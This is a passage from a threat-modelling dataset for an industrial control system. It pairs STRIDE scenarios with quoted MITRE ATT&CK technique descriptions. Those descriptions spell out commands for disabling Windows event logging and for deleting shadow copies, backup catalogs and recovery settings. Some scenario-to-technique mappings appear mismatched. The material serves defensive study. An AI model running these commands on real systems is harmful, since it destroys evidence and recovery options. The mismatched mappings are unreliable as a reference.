                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies performing actions that impacted production after exploiting weak logging mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "System logs do not capture all critical user actions.",
                    "Role": "Systems Administrator",
                    "Condition": "Incomplete or insufficient logging policies."
                },
                {
                    "Assumption": "Log integrity is not maintained.",
                    "Role": "Security Officer",
                    "Condition": "Logs are not tamper-proof."
                },
                {
                    "Assumption": "Lack of synchronized time across devices.",
                    "Role": "Network Administrator",
                    "Condition": "Inconsistent system time settings."
                }
            ],
            "Potential Impact": "Inability to trace actions to specific users could affect investigations and accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "user actions",
                "forensic analysis"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates transaction logs of gateway operations to evade detection.",
            "Assumptions": [
                {
                    "Assumption": "Weak integrity controls on transaction logs.",
                    "Role": "Gateway Administrator",
                    "Condition": "Logs are not protected against tampering."
                },
                {
                    "Assumption": "No regular log audits.",
                    "Role": "Compliance Officer",
                    "Condition": "Lack of periodic review of logs."
                },
                {
                    "Assumption": "Insufficient monitoring of gateway activities.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of real-time monitoring tools."
                }
            ],
            "Potential Impact": "Covers tracks of malicious activities, complicating incident response and recovery efforts.",
            "MITRE ATT&CK Keywords": [
                "transaction logs",
                "gateway",
                "log tampering",
                "repudiation"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming)\u00a0\n\nWhen used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide)\u00a0Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)\n\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)\n\nAdversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)",
                "id": "attack-pattern--a1b52199-c8c5-438a-9ded-656f1d0888c6",
                "technique_id": "T1547.006"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A disgruntled employee deletes audit logs on cloud services to mask unauthorized activities.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services do not use immutable logging.",
                    "Role": "Cloud Service Administrator",
                    "Condition": "Audit logs can be deleted or altered."
                },
                {
                    "Assumption": "Policies allow broad access to logging functions.",
                    "Role": "IT Policy Maker",
                    "Condition": "Insufficient restrictions on log access permissions."
                },
                {
                    "Assumption": "No redundant or off-site log storage.",
                    "Role": "Backup Administrator",
                    "Condition": "Logs are not backed up in real-time."
                }
            ],
            "Potential Impact": "Loss of critical forensic data hampers investigation and accountability.",
            "MITRE ATT&CK Keywords": [
                "cloud services",
                "audit logs",
                "log deletion",
                "repudiation"
            ],
            "mitre_technique": {
                "name": "Inhibit System Recovery",
                "description": "Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Talos Olympic Destroyer 2018)(Citation: FireEye WannaCry 2017) Furthermore, adversaries may disable recovery notifications, then corrupt backups.(Citation: disable_notif_synology_ransom)\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n* <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code> (Citation: Diskshadow) (Citation: Crytox Ransomware)\n\nOn network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nAdversaries may also delete \u201conline\u201d backups that are connected to their network \u2013 whether via network storage media or through folders that sync to cloud services.(Citation: ZDNet Ransomware Backups 2020) In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.(Citation: Dark Reading Code Spaces Cyber Attack)(Citation: Rhino Security Labs AWS S3 Ransomware)",
                "id": "attack-pattern--f5d8eed6-48a9-4cdf-a3d7-d1ffa99c3d2a",
                "technique_id": "T1490"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized cloud access leads to exposure of sensitive operational data.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate access controls on cloud storage.",
                    "Role": "Cloud Security Administrator",
                    "Condition": "Cloud storage permissions are too permissive."
                },
                {
                    "Assumption": "Cloud data is not encrypted.",
                    "Role": "Data Protection Officer",
                    "Condition": "Lack of encryption for stored data."
                },
                {
                    "Assumption": "Cloud service provider does not notify of unauthorized access promptly.",
                    "Role": "Service Provider",
                    "Condition": "Inefficient alerting mechanisms."
                }
            ],
            "Potential Impact": "Disclosure of proprietary information and compromised operational security.",
            "MITRE ATT&CK Keywords": [
                "cloud access",
                "data exposure",
                "operational data",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Forge Web Credentials",
                "description": "Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.\n\nAdversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nThe generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator) Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials (i.e., [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005)), or the `zmprov gdpak` command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.(Citation: AWS Temporary Security Credentials)(Citation: Zimbra Preauth)\n\nOnce forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)  ",
                "id": "attack-pattern--94cb00a4-b295-4d06-aa2b-5653b9c1be9c",
                "technique_id": "T1606"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data intercepted between field devices and RTUs due to lack of encryption.",
            "Assumptions": [
                {
                    "Assumption": "Communication is not encrypted between field devices and RTUs.",
                    "Role": "Network Security Engineer",
                    "Condition": "Use of unsecure communication protocols."
                },
                {
                    "Assumption": "Network traffic is accessible by unauthorized entities.",
                    "Role": "Network Defender",
                    "Condition": "Improper network segmentation or secure zones."
                },
                {
                    "Assumption": "Sensitive data is transmitted in plain text.",
                    "Role": "Data Custodian",
                    "Condition": "Lack of data encryption policies."
                }
            ],
            "Potential Impact": "Exposure of critical operational and sensor data could be used for industrial espionage.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "field devices",
                "RTUs",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Module Firmware",
                "description": "Adversaries may install malicious or vulnerable firmware onto modular hardware devices. Control system devices often contain modular hardware devices. These devices may have their own set of firmware that is separate from the firmware of the main control system equipment.   \n\nThis technique is similar to [System Firmware](https://attack.mitre.org/techniques/T0857), but is conducted on other system components that may not have the same capabilities or level of integrity checking. Although it results in a device re-image, malicious device firmware may provide persistent access to remaining devices. (Citation: Daniel Peck,  Dale Peterson January 2009)  \n\nAn easy point of access for an adversary is the Ethernet card, which may have its own CPU, RAM, and operating system. The adversary may attack and likely exploit the computer on an Ethernet card. Exploitation of the Ethernet card computer may enable the adversary to accomplish additional attacks, such as the following: (Citation: Daniel Peck,  Dale Peterson January 2009)  \n\n* Delayed Attack - The adversary may stage an attack in advance and choose when to launch it, such as at a particularly damaging time.  \n* Brick the Ethernet Card - Malicious firmware may be programmed to result in an Ethernet card failure, requiring a factory return.  \n* Random Attack or Failure - The adversary may load malicious firmware onto multiple field devices. Execution of an attack and the time it occurs is generated by a pseudo-random number generator.   \n* A Field Device Worm - The adversary may choose to identify all field devices of the same model, with the end goal of performing a device-wide compromise.  \n* Attack Other Cards on the Field Device - Although it is not the most important module in a field device, the Ethernet card is most accessible to the adversary and malware. Compromise of the Ethernet card may provide a more direct route to compromising other modules, such as the CPU module.",
                "id": "attack-pattern--efbf7888-f61b-4572-9c80-7e2965c60707",
                "technique_id": "T0839"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to the database storing operational data in the MES.",
            "Assumptions": [
                {
                    "Assumption": "Database access controls are weak or misconfigured.",
                    "Role": "Database Administrator",
                    "Condition": "Poor access control configurations."
                },
                {
                    "Assumption": "Database does not support encryption at rest.",
                    "Role": "Security Officer",
                    "Condition": "Database engine lacks encryption capabilities."
                },
                {
                    "Assumption": "Insufficient monitoring of database access patterns.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of anomaly detection mechanisms."
                }
            ],
            "Potential Impact": "Extraction of sensitive production data, leading to exposure and potential misuse.",
            "MITRE ATT&CK Keywords": [
                "database access",
                "operational data",
                "MES",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack overwhelms control center resources.",
            "Assumptions": [
                {
                    "Assumption": "Control center is accessible via the internet.",
                    "Role": "Network Security Engineer",
                    "Condition": "Public IP exposure."
                },
                {
                    "Assumption": "Lack of DDoS mitigation strategies in place.",
                    "Role": "IT Security Officer",
                    "Condition": "No active DDoS protection measures."
                },
                {
                    "Assumption": "Network bandwidth is insufficient to handle high traffic volumes.",
                    "Role": "Network Administrator",
                    "Condition": "Limited bandwidth capacity."
                }
            ],
            "Potential Impact": "Interruption of control operations leading to production delays and potential disruptions.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "control center",
                "resource exhaustion",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infection on field devices causes system-wide disruption.",
            "Assumptions": [
                {
                    "Assumption": "Field devices lack adequate malware protection.",
                    "Role": "Security Officer",
                    "Condition": "No anti-malware mechanisms installed."
                },
                {
                    "Assumption": "Insecure connections to field devices.",
                    "Role": "Network Administrator",
                    "Condition": "Open ports and exposed services."
                },
                {
                    "Assumption": "Regular software patching and updates are not enforced.",
                    "Role": "Systems Administrator",
                    "Condition": "Outdated firmware and software versions."
                }
            ],
            "Potential Impact": "Disruption of industrial processes and field device failures.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "field devices",
                "system disruption",
                "denial of service"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker targets the gateway to overload it, causing interruptions in data communication.",
            "Assumptions": [
                {
                    "Assumption": "Gateway does not have rate-limiting mechanisms.",
                    "Role": "Gateway Administrator",
                    "Condition": "Lack of rate-limiting policies."
                },
                {
                    "Assumption": "Gateway lacks sufficient processing power to handle high load.",
                    "Role": "IT Infrastructure Manager",
                    "Condition": "Insufficient hardware resources."
                },
                {
                    "Assumption": "No mechanism to filter or block malicious traffic.",
                    "Role": "Network Security Engineer",
                    "Condition": "Absence of advanced firewall and filtering techniques."
                }
            ],
            "Potential Impact": "Loss of communication between field devices and cloud services, affecting operational continuity.",
            "MITRE ATT&CK Keywords": [
                "gateway overload",
                "data communication",
                "denial of service",
                "network traffic"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploiting vulnerable application to gain administrative access to MES.",
            "Assumptions": [
                {
                    "Assumption": "Application has unpatched vulnerabilities.",
                    "Role": "Application Developer",
                    "Condition": "Delay in applying security patches."
                },
                {
                    "Assumption": "Administrative interfaces are poorly protected.",
                    "Role": "Systems Administrator",
                    "Condition": "Weak authentication for administrative access."
                },
                {
                    "Assumption": "User roles and permissions are misconfigured.",
                    "Role": "Security Officer",
                    "Condition": "Improper user role assignments."
                }
            ],
            "Potential Impact": "Full control over MES allowing manipulation of workflows and data theft.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "administrative access",
                "MES",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Domain Generation Algorithms",
                "description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)\n\nDGAs can take the form of apparently random or \u201cgibberish\u201d strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)\n\nAdversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",
                "id": "attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd",
                "technique_id": "T1568.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages weak access controls on field devices to reconfigure them.",
            "Assumptions": [
                {
                    "Assumption": "Field devices permit broad access without strong controls.",
                    "Role": "Field Device Manager",
                    "Condition": "Lack of stringent access control policies."
                },
                {
                    "Assumption": "Insecure network access points.",
                    "Role": "Network Security Engineer",
                    "Condition": "Open or unprotected access points."
                },
                {
                    "Assumption": "Weak or default credentials are used.",
                    "Role": "Security Officer",
                    "Condition": "No enforcement of strong password policies."
                }
            ],
            "Potential Impact": "Ability to modify device settings, leading to potential production sabotage.",
            "MITRE ATT&CK Keywords": [
                "access controls",
                "field devices",
                "privilege elevation",
                "configuration"
            ],
            "mitre_technique": {
                "name": "Linux and Mac File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform\u2019s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs: <code>chown</code> (short for change owner), and <code>chmod</code> (short for change mode).\n\nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004) or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).(Citation: 20 macOS Common Tools and Techniques) ",
                "id": "attack-pattern--09b130a2-a77e-4af0-a361-f46f9aad1345",
                "technique_id": "T1222.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of cloud services API to escalate privileges and access restricted data.",
            "Assumptions": [
                {
                    "Assumption": "Exposed API endpoints are not adequately secured.",
                    "Role": "Cloud Service Developer",
                    "Condition": "APIs lack robust authentication mechanisms."
                },
                {
                    "Assumption": "Users with access tokens have excessive permissions.",
                    "Role": "Security Officer",
                    "Condition": "Over-permissive access tokens."
                },
                {
                    "Assumption": "API rate limits and usage monitoring are not enforced.",
                    "Role": "API Manager",
                    "Condition": "No controls on API usage."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and potential manipulation of cloud services.",
            "MITRE ATT&CK Keywords": [
                "cloud services",
                "API exploitation",
                "privilege escalation",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "1",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of a legitimate field device to gain unauthorized access to the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network used by field devices.",
                    "Role": "Attacker",
                    "Condition": "Network access"
                },
                {
                    "Assumption": "The system lacks mutual authentication mechanisms between the control center and field devices.",
                    "Role": "System Design",
                    "Condition": "Missing mutual authentication"
                },
                {
                    "Assumption": "Field devices do not use unique, unforgeable identifiers for communication.",
                    "Role": "Device Configuration",
                    "Condition": "No unique identifiers"
                }
            ],
            "Potential Impact": "Unauthorized access leading to data modification or disruption of industrial processes.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
